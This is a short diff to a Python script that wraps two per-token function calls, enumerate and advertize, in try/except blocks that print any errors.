@@ -16,6 +16,12 @@ def get_tokens():
 
 if __name__ == "__main__":
     for token in get_tokens():
-        enumerate(token)
-        advertize(token)
+        try:
+            enumerate(token)
+        except Exception as e:
+            print(e)
+        try:
+            advertize(token)
+        except Exception as e:
+            print(e)
     
